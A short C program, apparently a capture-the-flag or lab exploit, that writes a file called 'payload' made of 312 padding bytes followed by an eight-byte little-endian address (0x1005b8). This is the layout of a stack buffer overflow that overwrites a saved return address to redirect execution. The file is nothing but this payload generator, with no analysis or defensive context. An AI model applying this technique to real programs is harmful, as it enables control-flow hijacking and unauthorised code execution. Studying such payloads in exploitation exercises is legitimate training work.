#include <stdio.h>


int main() {
	FILE *f=fopen("payload","wb");
	for (int i=0; i<312; i++) {
		char val=0x00;
		fwrite(&val, 1, 1, f);
	};
	char r[]={0xb8,0x05,0x01,0x00,0x00,0x00,0x00,0x00};
	fwrite(r,1,8,f);
	fclose(f);
	return 0;
}
